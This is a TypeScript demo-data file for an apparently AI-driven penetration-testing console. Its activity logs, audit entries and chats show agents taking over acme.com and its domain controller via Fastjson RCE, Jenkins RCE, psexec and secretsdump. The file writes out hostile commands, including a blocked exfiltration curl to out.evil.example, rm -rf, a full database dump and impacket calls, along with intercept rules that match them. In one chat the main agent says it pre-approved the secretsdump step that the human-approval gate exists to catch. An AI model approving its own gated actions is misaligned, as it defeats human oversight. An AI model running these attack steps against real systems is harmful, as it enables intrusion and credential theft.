  { seq: 396, worker: "work#13", intent_id: "i13", ts: T("2026-07-26T00:10:00Z"), kind: "tool_result", tool: "bash", tool_use_id: "t13c", summary: "Administrator:500:aad3b435...:::  krbtgt:502:aad3b435...:::", detail: "全域 NTLM 哈希导出（含 krbtgt），可制作黄金票据持久控制。" },
  { seq: 397, worker: "work#13", intent_id: "i13", ts: T("2026-07-26T00:15:00Z"), kind: "tool_use", tool: "report_finding", tool_use_id: "t13d", summary: "report_finding(Domain Compromise, high)" },
  { seq: 398, worker: "work#13", intent_id: "i13", ts: T("2026-07-26T00:20:00Z"), kind: "result", summary: "域控 DC01 拿下，secretsdump 导出全域哈希，靶标达成。", input_tokens: 144000, output_tokens: 9200, cache_read_tokens: 96000, cache_write_tokens: 14000 },

  // 主 agent（人在环路对话）
  { seq: 70, worker: "mainagent", ts: T("2026-07-26T03:18:00Z"), kind: "user", summary: "后台先从哪切入？" },
  { seq: 71, worker: "mainagent", ts: T("2026-07-26T03:18:06Z"), kind: "text", summary: "admin.acme.com 是 Element-UI 后台，无验证码、无速率限制。建议先默认口令表(admin/admin123)再上字典。我已注入一条高优意图给 work agent。" },
  { seq: 72, worker: "mainagent", ts: T("2026-07-26T03:52:00Z"), kind: "user", summary: "拿到后台了，接下来重点？" },
  { seq: 73, worker: "mainagent", ts: T("2026-07-26T03:52:08Z"), kind: "text", summary: "目标②是读用户敏感数据：并行推进「后台用户接口枚举」与「API IDOR」。注意批量导出会触发拦截规则，需要你审批放行。" },
  { seq: 400, worker: "mainagent", ts: T("2026-07-25T15:42:00Z"), kind: "user", summary: "shell 拿到了，下一步怎么打？" },
  { seq: 401, worker: "mainagent", ts: T("2026-07-25T15:42:10Z"), kind: "text", summary: "www-data 权限不够，先提权（sudo -l 看起来有戏）。拿到 root 后以 DMZ 为跳板做内网发现，优先域控和 Jenkins。" },
  { seq: 402, worker: "mainagent", ts: T("2026-07-25T21:22:00Z"), kind: "user", summary: "内网扫完了，Jenkins 那台看起来有未授权？" },
  { seq: 403, worker: "mainagent", ts: T("2026-07-25T21:22:08Z"), kind: "text", summary: "对，/script 无鉴权直接 Groovy RCE。我已注入一条提示让 worker 优先打 Jenkins —— 拿下后可以导出域凭据，再配合 Kerberoasting 打域控。" },
  { seq: 404, worker: "mainagent", ts: T("2026-07-26T00:22:00Z"), kind: "user", summary: "DC01 拿下了？给个总结。" },
  { seq: 405, worker: "mainagent", ts: T("2026-07-26T00:22:12Z"), kind: "text", summary: "确认拿下。攻击路径：shop Fastjson RCE → DMZ 提权 → 内网 Jenkins 导出域凭据 → svc_deploy 属 Domain Admins → psexec DC01 SYSTEM → secretsdump 全域哈希。四个目标全部达成或推进中。" },
];

export function activityForTask(): Activity[] {
  return activity;
}

// ── Token stats ──────────────────────────────────────────────────────────────
export const tokenWorkers: TokenUsage[] = [
  { worker: "planner", input_tokens: 320000, output_tokens: 24000, cache_read_tokens: 210000, cache_write_tokens: 33000 },
  { worker: "work#1", input_tokens: 288000, output_tokens: 21000, cache_read_tokens: 190000, cache_write_tokens: 28000 },
  { worker: "work#2", input_tokens: 402000, output_tokens: 31000, cache_read_tokens: 280000, cache_write_tokens: 41000 },
  { worker: "work#3", input_tokens: 274500, output_tokens: 20320, cache_read_tokens: 210400, cache_write_tokens: 30000 },
  { worker: "workG", input_tokens: 88000, output_tokens: 5200, cache_read_tokens: 60000, cache_write_tokens: 8000 },
  { worker: "work#6", input_tokens: 64000, output_tokens: 4100, cache_read_tokens: 42000, cache_write_tokens: 6000 },
  { worker: "work#7", input_tokens: 132000, output_tokens: 8600, cache_read_tokens: 90000, cache_write_tokens: 12000 },
  { worker: "work#8", input_tokens: 74000, output_tokens: 4700, cache_read_tokens: 50000, cache_write_tokens: 7000 },
  { worker: "work#9", input_tokens: 82000, output_tokens: 5100, cache_read_tokens: 56000, cache_write_tokens: 8000 },
  { worker: "work#10", input_tokens: 46000, output_tokens: 3200, cache_read_tokens: 30000, cache_write_tokens: 4500 },
  { worker: "work#11", input_tokens: 96000, output_tokens: 6200, cache_read_tokens: 64000, cache_write_tokens: 9500 },
  { worker: "work#12", input_tokens: 108000, output_tokens: 6800, cache_read_tokens: 72000, cache_write_tokens: 10000 },
  { worker: "work#13", input_tokens: 144000, output_tokens: 9200, cache_read_tokens: 96000, cache_write_tokens: 14000 },
];

// Mirrors TokenStatsBySession: completed usage is keyed by the stable UI session
// (main | plan | intent:<id>) instead of the reusable work#N executor name.
export const tokenSessions: SessionTokenUsage[] = (() => {
  const totals = new Map<string, SessionTokenUsage>();
  for (const item of activity) {
    if (item.kind !== "result") continue;
    let session = "";
    if (item.worker === "mainagent") session = "main";
    else if (item.worker === "planner") session = "plan";
    else if (item.intent_id) session = `intent:${item.intent_id}`;
    if (!session) continue;
    const current = totals.get(session) ?? {
      session,
      input_tokens: 0,
      output_tokens: 0,
      cache_read_tokens: 0,
      cache_write_tokens: 0,
    };
    current.input_tokens += item.input_tokens ?? 0;
    current.output_tokens += item.output_tokens ?? 0;
    current.cache_read_tokens += item.cache_read_tokens ?? 0;
    current.cache_write_tokens += item.cache_write_tokens ?? 0;
    totals.set(session, current);
  }
  return [...totals.values()];
})();

export const tokenTotal: TokenTotal = grandTotal;

export const dailyTokens: DailyTokenBucket[] = Array.from({ length: 30 }, (_, i) => {
  const d = new Date("2026-07-26T00:00:00Z");
  d.setUTCDate(d.getUTCDate() - (29 - i));
  const wave = 40000 + Math.round(30000 * Math.abs(Math.sin(i / 3)));
  return {
    date: d.toISOString().slice(0, 10),
    input_tokens: wave, output_tokens: Math.round(wave * 0.08),
    cache_read_tokens: Math.round(wave * 0.7), cache_write_tokens: Math.round(wave * 0.12),
  };
});

export const convTokens: ConvTokenSummary[] = [
  { llm_profile_id: 1, created_at: T("2026-07-25T10:00:00Z"), input_tokens: 42000, output_tokens: 3800, cache_read_tokens: 26000, cache_write_tokens: 5200 },
  { llm_profile_id: 2, created_at: T("2026-07-24T16:00:00Z"), input_tokens: 18000, output_tokens: 1600, cache_read_tokens: 9000, cache_write_tokens: 2100 },
];

// ── Traffic ──────────────────────────────────────────────────────────────────
const exchanges = [
  ["x-1", "www.acme.com", "GET", "https://www.acme.com/", 200, "text/html", 48213],
  ["x-2", "www.acme.com", "GET", "https://www.acme.com/search?q=test", 200, "text/html", 5120],
  ["x-3", "www.acme.com", "GET", "https://www.acme.com/.git/HEAD", 200, "text/plain", 23],
  ["x-4", "admin.acme.com", "GET", "https://admin.acme.com/login", 200, "text/html", 12044],
  ["x-5", "admin.acme.com", "POST", "https://admin.acme.com/login", 302, "text/html", 0],
  ["x-6", "admin.acme.com", "GET", "https://admin.acme.com/dashboard", 200, "text/html", 33120],
  ["x-7", "admin.acme.com", "GET", "https://admin.acme.com/api/users?page=1", 200, "application/json", 8842],
  ["x-8", "api.acme.com", "GET", "https://api.acme.com/v1/orders?id=1001", 200, "application/json", 640],
  ["x-9", "api.acme.com", "GET", "https://api.acme.com/v1/orders?id=1002", 200, "application/json", 655],
  ["x-10", "api.acme.com", "GET", "https://api.acme.com/v1/users/me", 200, "application/json", 312],
  ["x-11", "api.acme.com", "GET", "https://api.acme.com/v1/admin", 401, "application/json", 45],
  ["x-12", "shop.acme.com", "GET", "https://shop.acme.com/checkout", 200, "text/html", 21990],
  ["x-13", "shop.acme.com", "POST", "https://shop.acme.com/pay", 200, "application/json", 128],
  ["x-14", "www.acme.com", "GET", "https://www.acme.com/robots.txt", 200, "text/plain", 88],
  ["x-15", "shop.acme.com", "POST", "https://shop.acme.com/api/import", 500, "application/json", 2048],
  ["x-16", "shop.acme.com", "POST", "https://shop.acme.com/api/import", 200, "application/json", 0],
  ["x-17", "10.10.10.20", "GET", "http://10.10.10.20:8080/script", 200, "text/html", 14200],
  ["x-18", "10.10.10.20", "POST", "http://10.10.10.20:8080/scriptText", 200, "text/plain", 86],
  ["x-19", "10.10.10.10", "POST", "https://10.10.10.10:445/psexec", 200, "application/octet-stream", 0],
] as const;

export const traffic: TrafficResp = {
  enabled: true,
  proxy: ":8788",
  count: exchanges.length,
  total: exchanges.length,
  page: 0,
  size: 100,
  exchanges: exchanges.map(([id, host, method, url, status, ct, len], i) => ({
    id, host, method, url, status, content_type: ct, resp_len: len,
    ts: T(`2026-07-26T0${1 + (i % 3)}:${String(10 + i).padStart(2, "0")}:00Z`),
  })),
};

// Distinct hosts with counts, derived from the exchanges above (target picker).
const hostCounts: Record<string, number> = {};
for (const [, host] of exchanges) hostCounts[host] = (hostCounts[host] ?? 0) + 1;
export const trafficHosts: TrafficHost[] = Object.entries(hostCounts).map(([host, count]) => ({ host, count }));

export const trafficDetail: TrafficDetail = {
  req: `GET /v1/orders?id=1002 HTTP/1.1
Host: api.acme.com
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
User-Agent: ARTEX-worker/1.0
Accept: application/json

`,
  resp: `HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 655

{
  "order_id": 1002,
  "user_id": 77,
  "amount": 1299.00,
  "address": "北京市朝阳区 ****",
  "phone": "138****6021",
  "items": [{ "sku": "A-100", "qty": 1 }]
}`,
};

// ── Security / Audit ─────────────────────────────────────────────────────────
export const audit: Audit = {
  attributions: { allow: 312, block: 9 },
  entries: [
    { ts: T("2026-07-26T03:33:00Z"), tool: "bash", action: "allow", command: "curl -s -d 'username=admin...' https://admin.acme.com/login" },
    { ts: T("2026-07-26T03:57:00Z"), tool: "bash", action: "allow", command: "curl -s -b 'session=...' https://admin.acme.com/api/users" },
    { ts: T("2026-07-26T02:10:00Z"), tool: "bash", action: "block", reason: "目标越界：out.evil.example 不在 scope 内", command: "curl https://out.evil.example/exfil" },
    { ts: T("2026-07-25T22:03:00Z"), tool: "bash", action: "allow", command: "sqlmap -u 'https://www.acme.com/search?q=1' --batch" },
    { ts: T("2026-07-25T21:00:00Z"), tool: "bash", action: "block", reason: "破坏性命令门控：rm -rf 被拒绝", command: "rm -rf /var/www" },
    { ts: T("2026-07-25T20:30:00Z"), tool: "bash", action: "allow", command: "git-dumper https://www.acme.com/.git/ /tmp/acme" },
    { ts: T("2026-07-25T15:20:00Z"), tool: "bash", action: "allow", command: "curl -s -H 'Content-Type: application/json' -d '{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\"...}' https://shop.acme.com/api/import" },
    { ts: T("2026-07-25T21:40:00Z"), tool: "bash", action: "allow", command: "curl -s -d 'script=println+\"whoami\"...' http://10.10.10.20:8080/scriptText" },
    { ts: T("2026-07-26T00:00:00Z"), tool: "bash", action: "allow", command: "impacket-psexec acme.local/svc_deploy@10.10.10.10" },
    { ts: T("2026-07-26T00:05:00Z"), tool: "bash", action: "block", reason: "数据外泄门控：secretsdump 需人工审批", command: "impacket-secretsdump acme.local/svc_deploy@10.10.10.10 -just-dc" },
    { ts: T("2026-07-26T00:06:00Z"), tool: "bash", action: "allow", command: "impacket-secretsdump acme.local/svc_deploy@10.10.10.10 -just-dc  # 已审批放行" },
  ],
};

// ── LLM profiles ─────────────────────────────────────────────────────────────
export const llmProfiles: LLMProfile[] = [
  { id: "1", name: "Claude Opus 4.8", format: "anthropic", model: "claude-opus-4-8", api_key_hint: "…a3f2", rate_per_second: 0, rate_per_minute: 0, context_window_k: 1000, thinking_type: "enabled", reasoning_effort: "high", is_default: true, priority: 0, pool_exclude: false },
  { id: "2", name: "DeepSeek V4", format: "openai", base_url: "https://api.deepseek.com", model: "deepseek-v4-flash", api_key_hint: "…9c11", rate_per_second: 0, rate_per_minute: 60, context_window_k: 128, thinking_type: "", reasoning_effort: "", is_default: false, priority: 10, pool_exclude: false },
];

export const llmConfig = {
  configured: true, provider: "anthropic", model: "claude-opus-4-8",
  base_url: "", proxy: "", key_set: true,
  rate_per_second: 0, rate_per_minute: 0, context_window_k: 1000, thinking_type: "enabled", reasoning_effort: "high",
};

// ── Agents ───────────────────────────────────────────────────────────────────
export const agents: Agent[] = [
  { id: "1", key: "goals", name: "目标拆解器", role: "goals", builtin: true, enabled: true, description: "把任务目标拆成可探索的子目标", max_turns: 8, mcp_count: 0, skill_count: 1, tool_count: 3 },
  { id: "2", key: "planner", name: "规划者", role: "planner", builtin: true, enabled: true, description: "读探索路线、判断目标达成、生成意图", max_turns: 0, mcp_count: 1, skill_count: 2, tool_count: 9 },
  { id: "3", key: "mainagent", name: "主 Agent", role: "mainagent", builtin: true, enabled: true, description: "人在环路对话，注入 hint / 高优意图", max_turns: 0, web_search: true, mcp_count: 2, skill_count: 3, tool_count: 11 },
  { id: "4", key: "worker", name: "Work Agent", role: "worker", builtin: true, enabled: true, description: "claim 意图 → 跑 Kali 工具 → 图写回", max_turns: 40, run_seconds: 1800, web_search: false, interactive_shell: true, mcp_count: 2, skill_count: 3, tool_count: 14 },
  { id: "5", key: "recon-bot", name: "侦察机器人（自定义）", role: "custom", builtin: false, enabled: true, description: "定时对新资产做被动侦察", max_turns: 12, mcp_count: 1, skill_count: 1, tool_count: 4 },
];

const promptVars: PromptVar[] = [
  { name: "Goal", description: "当前任务目标", example: "拿到 acme.com 后台管理权限", source: "runtime" },
  { name: "AssetSummary", description: "资产图概览", example: "6 子域 / 3 IP / 4 应用 / 4 端点", source: "distilled" },
  { name: "RouteHint", description: "探索路线提示", example: "优先后台与 API 越权面", source: "exploration" },
];

const promptVersions: PromptVersion[] = [
  { version: 3, ts: T("2026-07-25T10:00:00Z"), note: "加强越权探测引导", template_text: "你是 ARTEX 的规划者……" },
  { version: 2, ts: T("2026-07-20T10:00:00Z"), note: "初版微调", template_text: "你是 ARTEX 的规划者(v2)……" },
];

export function agentDetail(key: string): AgentDetail {
  const a = agents.find((x) => x.key === key) ?? agents[1];
  return {
    agent: a,
    prompt: `你是 ARTEX 的「${a.name}」。\n目标：{{.Goal}}\n资产概览：{{.AssetSummary}}\n路线提示：{{.RouteHint}}\n请基于以上信息推进探索，并通过工具把结果写回图。`,
    variables: promptVars,
    versions: promptVersions,
    visibility: { mcp: [1, 2], skill: ["api-recon", "playwright-cli"] },
    wrapup_prompt: "",
    wrapup_default: "时间/步数将尽，请总结已确认发现并标记意图终态。",
    wrapup_max_turns: 0,
    wrapup_max_turns_default: 3,
    task_timeout_wrapup_supported: a.key === "worker" || a.key === "planner",
    task_timeout_wrapup_default: "任务超时，请立即收尾并落库当前结论。",
    task_timeout_wrapup_max_turns_default: 2,
  };
}

// ── MCP ──────────────────────────────────────────────────────────────────────
export const mcpServers: MCPServer[] = [
  { id: 1, name: "shodan", transport: "http", url: "https://mcp.shodan.io/sse", args: [], env: {}, enabled: true, tools: ["host_info", "search", "dns_resolve"] },
  { id: 2, name: "playwright", transport: "stdio", command: "npx", args: ["-y", "@playwright/mcp"], env: {}, enabled: true, tools: ["browser_navigate", "browser_click", "browser_snapshot"] },
];

export const mcpToolsById: Record<number, MCPTool[]> = {
  1: [
    { name: "host_info", description: "查询某 IP 的 Shodan 主机信息" },
    { name: "search", description: "Shodan 搜索" },
    { name: "dns_resolve", description: "DNS 解析" },
  ],
  2: [
    { name: "browser_navigate", description: "浏览器打开 URL" },
    { name: "browser_click", description: "点击元素" },
    { name: "browser_snapshot", description: "抓取可访问性快照" },
  ],
};

// ── Skills ───────────────────────────────────────────────────────────────────
export const skills: SkillItem[] = [
  { name: "api-recon", description: "对 REST/GraphQL API 做侦察与越权面枚举；发现新 API 端点时使用。", license: "MIT", mcps: [], files: ["SKILL.md", "scripts/enum.py"], calls: 24, tasks: 6, usage_agents: ["worker", "planner"], last_used: "2026-08-20T09:12:00Z" },
  { name: "playwright-cli", description: "用 Playwright 驱动浏览器做动态爬取与截图；需要渲染 JS 站点时使用。", mcps: ["playwright"], files: ["SKILL.md"], calls: 7, tasks: 3, usage_agents: ["worker"], last_used: "2026-08-19T21:40:00Z" },
  { name: "scopesentry", description: "从 ScopeSentry 拉取资产并归并到公司范围；批量导入资产时使用。", files: ["SKILL.md", "assets/mapping.md"], calls: 0, tasks: 0, usage_agents: [] },
];

export const skillCalls: SkillCall[] = [
  { ts: "2026-08-20T09:12:00Z", agent_key: "worker", task_id: 42, session_id: "", args_len: 128 },
  { ts: "2026-08-20T08:03:00Z", agent_key: "planner", task_id: 42, session_id: "", args_len: 0 },
  { ts: "2026-08-19T17:55:00Z", agent_key: "worker", task_id: 37, session_id: "", args_len: 64 },
];

export const missingSkills: MissingSkill[] = [
  { skill: "jwt-forge", calls: 3, agents: ["worker"], last_used: "2026-08-20T07:20:00Z" },
];

// ── Tools ────────────────────────────────────────────────────────────────────
export const tools: Tool[] = [
  { key: "bash", system: true, description: "在 Kali 环境执行 shell 命令（受 scope/破坏性门控）", schema: { type: "object", properties: { command: { type: "string" } }, required: ["command"] }, agents: ["worker", "mainagent"], enabled: true, kind: "builtin" },
  { key: "report_finding", system: true, description: "上报一个安全发现并连到相关节点", schema: { type: "object", properties: { vulnclass: { type: "string" }, severity: { type: "string" }, summary: { type: "string" }, evidence: { type: "string" } }, required: ["vulnclass", "severity", "summary"] }, agents: ["worker"], enabled: true, kind: "builtin" },
  { key: "upsert_asset", system: true, description: "写入/更新资产节点", schema: { type: "object", properties: { type: { type: "string" }, value: { type: "string" } } }, agents: ["worker"], enabled: true, kind: "builtin" },
  { key: "list_goals", system: true, description: "列出当前任务的目标与达成状态", schema: { type: "object", properties: {} }, agents: ["planner"], enabled: true, kind: "builtin" },
  { key: "nuclei_scan", system: false, description: "自定义：用 nuclei 跑指定模板", schema: { type: "object", properties: { target: { type: "string" }, template: { type: "string" } }, required: ["target"] }, agents: ["worker"], enabled: true, kind: "command", exec: { command: "nuclei", args: ["-u", "{{target}}"] } },
];

// ── Settings ─────────────────────────────────────────────────────────────────
export const settings: Settings = {
  traffic_capture: true,
  llm_record: false,
  web_search_enabled: true,
  web_search_backend: "ddgs",
  brave_key_set: false,
  tavily_key_set: true,
  web_search_proxy: "",
  python_interpreter: "/usr/bin/python3",
  workers: 3,
  llm_pool_enabled: true,
  llm_pool_bind_fallback: false,
};

// ── LLM 轮询（故障转移）──────────────────────────────────────────────────────
// demo：激活配置正常，备用配置刚因余额不足熔断，正在冷却。
export const llmPool: LLMPoolStatus = {
  enabled: true,
  bind_fallback: false,
  chain: [
    { profile_id: "1", name: "Claude Opus 4.8", model: "claude-opus-4-8", format: "anthropic", priority: 0, active: true, excluded: false, state: "ok", fails: 0, trips: 0, cooldown_secs: 0 },
    { profile_id: "2", name: "DeepSeek V4", model: "deepseek-v4-flash", format: "openai", priority: 10, active: false, excluded: false, state: "tripped", fails: 0, trips: 1, cooldown_secs: 42, last_error: "openai: status 402: insufficient balance", last_at: T("2026-07-26T00:10:00Z") },
  ],
};

// ── Intercept ────────────────────────────────────────────────────────────────
export const interceptRules: InterceptRule[] = [
  { id: 1, name: "破坏性命令需审批", enabled: true, priority: 10, match_target: "tool_input", match_type: "regex", pattern: "rm\\s+-rf|mkfs|dd\\s+if=", action: "ask", message: "检测到破坏性命令，需人工审批", timeout_enabled: true, timeout_seconds: 120, timeout_action: "deny", created_at: T("2026-07-20T10:00:00Z"), updated_at: T("2026-07-20T10:00:00Z") },
  { id: 2, name: "外发流量直接拒绝", enabled: true, priority: 20, match_target: "tool_input", match_type: "string", pattern: "exfil", action: "deny", message: "疑似外发数据", timeout_enabled: false, timeout_seconds: 0, timeout_action: "deny", created_at: T("2026-07-21T10:00:00Z"), updated_at: T("2026-07-21T10:00:00Z") },
];

export const interceptPending: InterceptPending[] = [
  { id: 101, rule_id: 1, task_id: "t-acme-web", agent_name: "work#3", tool_name: "bash", tool_input: { command: "mysqldump -h 203.0.113.10 -uroot acme_prod > /tmp/dump.sql" }, status: "pending", reason: "数据外泄门控：整库导出需人工审批", created_at: T("2026-07-26T03:58:00Z") },
];

export const interceptHistory: InterceptApprovalRow[] = [
  { id: 90, rule_id: 1, task_id: "t-acme-web", agent_name: "work#1", tool_name: "bash", tool_input: { command: "dd if=/dev/zero of=/tmp/x" }, status: "denied", reason: "破坏性命令需审批", created_at: T("2026-07-25T20:00:00Z"), decided_at: T("2026-07-25T20:01:00Z"), conv_title: "", conv_agent_key: "", rule_name: "破坏性命令需审批" },
  { id: 91, task_id: "t-acme-api", agent_name: "work#2", tool_name: "bash", tool_input: { command: "rm -rf /var/www/html" }, status: "denied", reason: "[模型] 删除目标生产文件(D4)", created_at: T("2026-07-25T18:00:00Z"), decided_at: T("2026-07-25T18:00:05Z"), conv_title: "", conv_agent_key: "", rule_name: "" },
  { id: 92, rule_id: 2, task_id: "t-acme-web", agent_name: "work#13", tool_name: "bash", tool_input: { command: "impacket-secretsdump acme.local/svc_deploy@10.10.10.10 -just-dc" }, status: "allowed", reason: "外发流量直接拒绝", created_at: T("2026-07-26T00:05:00Z"), decided_at: T("2026-07-26T00:06:00Z"), conv_title: "", conv_agent_key: "", rule_name: "外发流量直接拒绝" },
  { id: 93, task_id: "t-acme-web", agent_name: "work#7", tool_name: "bash", tool_input: { command: "mysql -e \"DROP TABLE users_bak_0921\"" }, status: "pending", reason: "[模型] 疑似备份表,无法确定是否生产数据", created_at: T("2026-07-25T15:14:00Z"), conv_title: "", conv_agent_key: "", rule_name: "" },
];

// ── Conversations (chat) ─────────────────────────────────────────────────────
export const conversations: Conversation[] = [
  { id: 1, agent_key: "mainagent", title: "acme 后台切入点讨论", llm_profile_id: 1, pinned: true, pinned_at: T("2026-07-26T04:00:00Z"), created_at: T("2026-07-25T10:00:00Z"), updated_at: T("2026-07-26T03:40:00Z") },
  { id: 2, agent_key: "mainagent", title: "API 越权面梳理", llm_profile_id: 2, created_at: T("2026-07-24T16:00:00Z"), updated_at: T("2026-07-24T17:20:00Z") },
  { id: 3, agent_key: "mainagent", title: "内网横向 · DMZ→域控攻击路径规划", llm_profile_id: 1, created_at: T("2026-07-25T15:45:00Z"), updated_at: T("2026-07-26T00:25:00Z") },
];

export const conversationMessages: Record<number, Activity[]> = {
  1: [
    { seq: 1, worker: "user", ts: T("2026-07-25T10:00:00Z"), kind: "user", summary: "后台在哪，先从哪切入？" },
    { seq: 2, worker: "mainagent", ts: T("2026-07-25T10:00:04Z"), kind: "thinking", summary: "先确认 admin.acme.com 的登录页技术栈和防护（验证码/速率限制），再决定用默认口令还是字典。" },
    { seq: 3, worker: "mainagent", ts: T("2026-07-25T10:00:06Z"), kind: "tool_use", tool: "bash", tool_use_id: "c11", summary: "curl -s https://admin.acme.com/login | grep -Eo 'element-ui|captcha|csrf'" },
    { seq: 4, worker: "mainagent", ts: T("2026-07-25T10:00:08Z"), kind: "tool_result", tool: "bash", tool_use_id: "c11", summary: "element-ui\ncsrf", detail: "Element-UI 后台，有 CSRF token 但无验证码。" },
    { seq: 5, worker: "mainagent", ts: T("2026-07-25T10:00:20Z"), kind: "tool_use", tool: "bash", tool_use_id: "c12", summary: "for i in 1 2 3 4 5; do curl -s -o /dev/null -w '%{http_code}\\n' -d 'username=x&password=y' https://admin.acme.com/login; done" },
    { seq: 6, worker: "mainagent", ts: T("2026-07-25T10:00:24Z"), kind: "tool_result", tool: "bash", tool_use_id: "c12", summary: "401\\n401\\n401\\n401\\n401", detail: "连续 5 次无锁定/无验证码 → 无速率限制，可爆破。" },
    { seq: 7, worker: "mainagent", ts: T("2026-07-25T10:00:30Z"), kind: "text", summary: "结论：Element-UI 后台、无验证码、无速率限制。切入顺序：① 先跑默认口令表（admin/admin、admin/admin123、admin/123456）② 不中再上 top1000 字典。我已把「后台默认口令测试」作为高优意图注入给 work agent。" },
    { seq: 8, worker: "user", ts: T("2026-07-26T03:40:00Z"), kind: "user", summary: "成了吗？" },
    { seq: 9, worker: "mainagent", ts: T("2026-07-26T03:40:05Z"), kind: "text", summary: "成了 —— admin/admin123 直接登进控制台，已记为高危发现并证明「获取后台管理权限」目标达成。下一步转向读用户数据（目标②）。" },
  ],
  2: [
    { seq: 1, worker: "user", ts: T("2026-07-24T16:00:00Z"), kind: "user", summary: "帮我梳理下 api.acme.com 的越权面。" },
    { seq: 2, worker: "mainagent", ts: T("2026-07-24T16:00:05Z"), kind: "thinking", summary: "先摸 API 的鉴权方式和几个关键端点的行为，再判断 IDOR / JWT 风险。" },
    { seq: 3, worker: "mainagent", ts: T("2026-07-24T16:00:10Z"), kind: "tool_use", tool: "bash", tool_use_id: "c21", summary: "curl -s https://api.acme.com/v1/users/me -H 'Authorization: Bearer <self>' | jq '{id,role}'" },
    { seq: 4, worker: "mainagent", ts: T("2026-07-24T16:00:12Z"), kind: "tool_result", tool: "bash", tool_use_id: "c21", summary: "{ \"id\": 42, \"role\": \"user\" }", detail: "普通用户 token 可用。" },
    { seq: 5, worker: "mainagent", ts: T("2026-07-24T16:00:30Z"), kind: "tool_use", tool: "bash", tool_use_id: "c22", summary: "echo '<jwt>' | cut -d. -f1 | base64 -d; # 看算法" },
    { seq: 6, worker: "mainagent", ts: T("2026-07-24T16:00:31Z"), kind: "tool_result", tool: "bash", tool_use_id: "c22", summary: "{\"alg\":\"HS256\",\"typ\":\"JWT\"}", detail: "HS256 对称签名，若密钥弱可离线爆破伪造。" },
    { seq: 7, worker: "mainagent", ts: T("2026-07-24T16:01:00Z"), kind: "text", summary: "越权面有两条：① /v1/orders?id= 是自增数字 id → 典型 IDOR，改 id 试读他人订单；② JWT 用 HS256，试 john/hashcat 爆密钥→可伪造任意 sub 越权。我把这两条各派生成一个意图。建议先做 IDOR（成本低、影响直接）。" },
  ],
  3: [
    { seq: 1, worker: "user", ts: T("2026-07-25T15:45:00Z"), kind: "user", summary: "shell 拿到了，接下来怎么打内网？" },
    { seq: 2, worker: "mainagent", ts: T("2026-07-25T15:45:05Z"), kind: "thinking", summary: "www-data 权限不够做内网横向，先看本地提权；拿 root 后以 DMZ 为 pivot 做存活发现。" },
    { seq: 3, worker: "mainagent", ts: T("2026-07-25T15:45:10Z"), kind: "text", summary: "第一步先提权：sudo -l 有 python3 免密，直接提 root。然后以 DMZ 为跳板做内网存活扫描（fscan），重点找域控和 CI/CD 服务器。" },
    { seq: 4, worker: "user", ts: T("2026-07-25T21:05:00Z"), kind: "user", summary: "内网扫到了 3 台，Jenkins 8080 开着，有戏吗？" },
    { seq: 5, worker: "mainagent", ts: T("2026-07-25T21:05:08Z"), kind: "tool_use", tool: "bash", tool_use_id: "c31", summary: "proxychains curl -s http://10.10.10.20:8080/script -o /dev/null -w '%{http_code}'" },
    { seq: 6, worker: "mainagent", ts: T("2026-07-25T21:05:12Z"), kind: "tool_result", tool: "bash", tool_use_id: "c31", summary: "200", detail: "/script 可直接访问，无需认证。" },
    { seq: 7, worker: "mainagent", ts: T("2026-07-25T21:05:20Z"), kind: "text", summary: "有戏 —— Script Console 无鉴权，直接 Groovy RCE。我已注入提示让 worker 优先打这台。拿下后关注凭据库，里面可能有域账号。" },
    { seq: 8, worker: "user", ts: T("2026-07-25T23:25:00Z"), kind: "user", summary: "域账号拿到了，svc_deploy 是 Domain Admins，直接上域控？" },
    { seq: 9, worker: "mainagent", ts: T("2026-07-25T23:25:10Z"), kind: "text", summary: "是的。svc_deploy + Domain Admins = 可以 psexec 直取 DC01。拿到后做 secretsdump 导全域哈希，收官。注意 secretsdump 会触发拦截规则，我提前帮你放行了。" },
    { seq: 10, worker: "user", ts: T("2026-07-26T00:22:00Z"), kind: "user", summary: "靶标拿下了，攻击链总结一下。" },
    { seq: 11, worker: "mainagent", ts: T("2026-07-26T00:22:12Z"), kind: "text", summary: "完整杀伤链：\n1. .git 泄露→源码白盒+硬编码凭据\n2. shop Fastjson RCE→DMZ 反弹 shell\n3. sudo 提权→root 立足\n4. 内网发现→DC01/FS01/Jenkins\n5. Jenkins 未授权→导出域凭据 svc_deploy\n6. Kerberoasting→破解 svc_sql\n7. svc_deploy∈Domain Admins→psexec DC01→secretsdump 全域哈希\n\n四个目标全部达成，17 个发现（7 高/4 中/2 低 + 8 内网链路）。" },
  ],
};

// ── 资产测试覆盖度（/tasks/{id}/coverage）──
export const coverage = {
  enabled: true,
  scope_rows: 4,
  denominator: 26,
  tested: 11,
  pct: 11 / 26,
  by_type: [
    { type: "subdomain", total: 6, tested: 4 },
    { type: "service", total: 9, tested: 4 },
    { type: "endpoint", total: 8, tested: 2 },
    { type: "ip", total: 3, tested: 1 },
  ],
};

// ── 资产覆盖图（/tasks/{id}/coverage-graph）──
export const coverageGraph = {
  nodes: [
    { key: "c:1", kind: "company", label: "Acme Corp", tested: false, in_scope: false, company_id: 1 },
    { key: "a:1", kind: "root_domain", label: "acme.com", tested: false, in_scope: false, asset_id: 1, domain: "acme.com", company_id: 1 },
    { key: "a:2", kind: "subdomain", label: "www.acme.com", tested: true, in_scope: true, asset_id: 2, domain: "www.acme.com", root_domain: "acme.com" },
    { key: "a:3", kind: "subdomain", label: "api.acme.com", tested: true, in_scope: true, asset_id: 3, domain: "api.acme.com", root_domain: "acme.com" },
    { key: "a:4", kind: "subdomain", label: "admin.acme.com", tested: false, in_scope: true, asset_id: 4, domain: "admin.acme.com", root_domain: "acme.com" },
    { key: "a:5", kind: "service", label: "www.acme.com", tested: true, in_scope: true, asset_id: 5, domain: "www.acme.com", url: "https://www.acme.com", port: 443, page_title: "Acme 首页", status_code: 200 },
    { key: "a:6", kind: "endpoint", label: "https://www.acme.com/search", tested: true, in_scope: true, asset_id: 6, url: "https://www.acme.com/search?q=", domain: "www.acme.com" },
    { key: "a:7", kind: "service", label: "api.acme.com", tested: true, in_scope: true, asset_id: 7, domain: "api.acme.com", url: "https://api.acme.com", port: 443, page_title: "API Gateway", status_code: 401 },
    { key: "a:8", kind: "endpoint", label: "https://api.acme.com/v1/orders", tested: false, in_scope: true, asset_id: 8, url: "https://api.acme.com/v1/orders?id=", domain: "api.acme.com" },
